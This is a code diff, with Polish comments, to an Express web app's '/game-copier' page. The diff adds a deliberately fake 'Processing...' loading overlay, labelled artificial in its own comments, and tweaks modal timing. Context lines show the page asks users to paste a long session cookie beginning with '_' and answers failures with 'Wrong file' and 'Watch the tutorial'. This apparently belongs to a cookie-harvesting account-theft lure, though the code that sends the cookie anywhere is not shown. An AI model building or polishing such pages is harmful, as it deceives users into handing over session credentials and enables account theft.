@@ -64,7 +64,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – modal z przyciskiem OK + szare tło
+// Podstrona /game-copier – z 1.2s sztucznym loadingiem + modalem
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -84,6 +84,7 @@ app.get('/game-copier', (req, res) => {
       position: relative;
     }
     canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
+
     .container {
       position: relative;
       z-index: 2;
@@ -104,6 +105,32 @@ app.get('/game-copier', (req, res) => {
       font-weight: 600;
       letter-spacing: -0.4px;
       text-align: center;
+    }
+
+    /* Loading overlay */
+    #loading {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.65);
+      z-index: 9998;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #444;
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    .loading-text {
+      color: white;
+      font-size: 1.4rem;
+      font-weight: 500;
     }
 
     /* Modal */
@@ -138,10 +165,16 @@ app.get('/game-copier', (req, res) => {
       border-radius: 12px;
       cursor: pointer;
       transition: all 0.2s;
+      color: white;
     }
-    .modal-btn.success { background: #28a745; color: white; }
-    .modal-btn.error   { background: #dc3545; color: white; }
+    .modal-btn.success { background: #28a745; }
+    .modal-btn.error   { background: #dc3545; }
     .modal-btn:hover { opacity: 0.9; transform: scale(1.05); }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
 
     /* Ramka zygzakowata – bez zmian */
     .zigzag-border {
@@ -272,6 +305,12 @@ app.get('/game-copier', (req, res) => {
 
   <canvas id="bgCanvas"></canvas>
 
+  <!-- Loading overlay -->
+  <div id="loading">
+    <div class="spinner"></div>
+    <div class="loading-text">Processing...</div>
+  </div>
+
   <!-- Modal -->
   <div id="modal">
     <div class="modal-content">
@@ -364,7 +403,8 @@ function animate() {
 }
 animate();
 
-// ── Modal z przyciskiem OK ──
+// ── Funkcje modal i loading ──
+const loading = document.getElementById('loading');
 const modal = document.getElementById('modal');
 const modalIcon = document.getElementById('modal-icon');
 const modalText = document.getElementById('modal-text');
@@ -383,16 +423,25 @@ function showModal(success, message, tip = '') {
   modal.style.display = 'flex';
 }
 
-// Logika przycisku
+// Logika przycisku z loadingiem 1.2s
 async function start() {
   const btn = document.getElementById('btn');
   const raw = document.getElementById('input').value.trim();
 
   btn.disabled = true;
 
+  // Pokazujemy sztuczne ładowanie
+  loading.style.display = 'flex';
+
+  // Czekamy 1.2 sekundy (sztuczne opóźnienie)
+  await new Promise(resolve => setTimeout(resolve, 1200));
+
+  // Ukrywamy loading
+  loading.style.display = 'none';
+
   if (!raw) {
     showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
-    setTimeout(() => btn.disabled = false, 1200);
+    setTimeout(() => btn.disabled = false, 800);
     return;
   }
 
@@ -421,7 +470,7 @@ async function start() {
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
     showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
-    setTimeout(() => btn.disabled = false, 1200);
+    setTimeout(() => btn.disabled = false, 800);
     return;
   }
 
